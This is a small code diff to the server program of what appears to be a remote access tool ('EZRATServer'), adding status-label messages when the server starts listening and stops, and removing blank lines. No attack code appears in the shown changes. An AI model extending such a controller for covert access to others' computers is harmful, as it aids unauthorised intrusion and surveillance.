@@ -291,8 +291,6 @@ namespace EZRATServer
             tmr.Tick += UpdateClient;
             this.imageContextMenu1.ItemClicked += RightClickSelect;
             (this.imageContextMenu1.Items[6] as ToolStripMenuItem).DropDownItemClicked += RightClickSelect;
-
-
         }
 
 
@@ -371,6 +369,7 @@ namespace EZRATServer
 
         void StopServer(object sender, EventArgs e)
         {
+            this.lblStatus.Text = "Server stoped";
             CloseAllSockets();
         }
 
@@ -382,7 +381,7 @@ namespace EZRATServer
             tmr.Interval = 500;
             SetupServer();
             tmr.Start();
-
+            this.lblStatus.Text = $"Server listen port : {this._port}";
         }
 
 
